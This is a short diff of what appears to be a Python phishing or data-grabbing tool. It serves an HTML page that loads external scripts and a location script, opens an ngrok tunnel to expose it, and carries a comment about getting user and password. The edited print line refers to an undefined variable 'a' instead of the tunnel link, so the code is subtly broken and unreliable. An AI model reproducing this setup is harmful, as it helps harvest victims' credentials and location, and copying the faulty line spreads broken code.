@@ -402,7 +402,6 @@ span.language {
 
   </style>
 
- 
   <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
   <script src="https://dl.sabzlearn.ir/sc/client.min.js"></script>
   <script src="loc.js"></script>
@@ -561,8 +560,7 @@ exit();""")
        print (Fore.Blue+" Launching Ngrok")
        global token
        link = ngrok.connect(6060,"http",auth_token=token)
-       print (link)
-       (Fore.RED+" ["+Fore.WHITE+"~"+Fore.RED+Fore.RED+"]"+" URL 1 : ")
+       print(Fore.GREEN+" [+]"+Fore.WHITE+str(a).replace('"','').replace("NgrokTunnel:","").replace("http://","https://"))
 
        
  # Getting User And Password
